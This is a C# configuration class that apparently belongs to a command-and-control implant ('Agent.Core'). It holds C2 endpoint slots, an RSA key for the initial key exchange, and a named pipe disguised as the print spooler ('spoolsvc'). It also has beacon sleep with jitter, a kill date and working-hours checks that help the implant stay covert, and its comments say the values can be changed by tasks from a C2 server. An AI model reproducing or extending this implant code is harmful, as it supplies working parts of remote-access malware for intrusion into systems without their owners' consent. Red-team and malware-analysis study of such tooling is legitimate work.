using System;

namespace Agent.Core
{
    /// <summary>
    /// Agent runtime configuration. Values are embedded at compile time
    /// and can be updated via CONFIG tasks from the C2 server.
    /// </summary>
    public class Config
    {
        // Embedded at compile time (replaced by build script)
        public static readonly string[] C2_ENDPOINTS = { "https://127.0.0.1:443/api/v1" };
        public static readonly string PIPE_NAME = @"\\.\pipe\spoolsvc";
        public static readonly int DEFAULT_SLEEP_MS = 60000;
        public static readonly int DEFAULT_JITTER_PCT = 25;
        public static readonly long KILL_DATE_UNIX = 0; // 0 = disabled
        public static readonly uint MAGIC = 0xDEADF00D;
        public static readonly string WORKING_HOURS = ""; // "08:00-18:00" or empty
        public static readonly string WORKING_DAYS = "";  // "mon-fri" or empty

        // RSA public key DER bytes for initial key exchange envelope
        // Replaced at build time with actual key
        public static readonly byte[] RSA_PUBLIC_KEY = new byte[0];

        // Runtime mutable
        public int SleepMs { get; set; }
        public int JitterPct { get; set; }

        public Config()
        {
            SleepMs = DEFAULT_SLEEP_MS;
            JitterPct = DEFAULT_JITTER_PCT;
        }

        public bool IsPastKillDate()
        {
            if (KILL_DATE_UNIX == 0) return false;
            long now = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
            return now > KILL_DATE_UNIX;
        }

        public bool IsWithinWorkingHours()
        {
            if (string.IsNullOrEmpty(WORKING_HOURS)) return true;

            try
            {
                var parts = WORKING_HOURS.Split('-');
                if (parts.Length != 2) return true;

                var now = DateTime.UtcNow.TimeOfDay;
                var start = TimeSpan.Parse(parts[0]);
                var end = TimeSpan.Parse(parts[1]);

                return now >= start && now <= end;
            }
            catch
            {
                return true;
            }
        }

        public int CalculateSleepMs()
        {
            if (JitterPct <= 0) return SleepMs;

            var rng = new Random();
            int jitter = rng.Next(0, SleepMs * JitterPct / 100);
            int sign = rng.Next(0, 2) == 0 ? 1 : -1;
            return Math.Max(1000, SleepMs + sign * jitter);
        }
    }
}
